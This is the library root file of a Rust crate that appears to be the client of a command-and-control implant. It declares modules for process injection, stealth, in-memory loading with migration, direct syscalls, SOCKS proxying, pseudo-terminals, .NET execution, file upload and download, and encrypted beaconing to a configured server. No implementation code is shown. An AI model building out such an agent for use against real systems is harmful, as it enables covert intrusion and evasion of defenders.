#[allow(unused_imports)]
#[macro_use]
extern crate log;

#[cfg(target_os = "windows")]
#[macro_use]
extern crate winapi;

/// Debug print macro — completely eliminated in release builds.
/// In debug builds, outputs via log::debug!.
/// In release builds, the entire expression (including format args) is dead code eliminated.
#[macro_export]
macro_rules! dbg_print {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        {
            log::debug!($($arg)*);
        }
    };
}

pub mod error;
pub mod types;
pub mod backoff;
#[cfg(feature = "ws")]
pub mod connection;
pub mod executor;
pub mod handler;
pub mod config;
pub mod fs;
pub mod transport;
pub mod crypto;

pub mod pty;
pub mod socks;
pub mod process;
#[macro_use]
pub mod utils;
pub mod injection;
#[cfg(target_os = "windows")]
pub mod dotnet;
pub mod plugin_router;
pub mod batch_handler;
pub mod stealth;
pub mod loader;
pub mod syscalls;

// 重新导出常用类型
pub use error::{ClientError, Result};
pub use types::{
    CommandPayload, CommandResult, MessageType, MessageWrapper, 
    RegisterPayload, ResponsePayload, SystemInfo,
};
pub use backoff::ExponentialBackoff;
#[cfg(feature = "ws")]
pub use connection::ConnectionManager;
pub use executor::CommandExecutor;
pub use handler::MessageHandler;
pub use config::{
    get_server_url, validate_server_url, get_config_info, ConfigInfo, 
    get_aes_key, get_crypto_config_info, CryptoConfigInfo,
    get_heartbeat_interval, get_dns_resolver
};
pub use fs::{ls, upload, download, FileInfo};
pub use transport::{Transport, create_transport};
pub use crypto::{encrypt, decrypt};

pub use utils::get_agent_uuid;
pub use injection::ProcessInjector;
#[cfg(target_os = "windows")]
pub use dotnet::DotNetExecutor;
pub use plugin_router::{PluginRouter, PluginTask, PluginMetadata, BatchExecutionManager, BatchConfig, BufferedResult};
pub use batch_handler::BatchMessageHandler;
pub use loader::{get_loader, MemoryLoader, MigrationStatus};
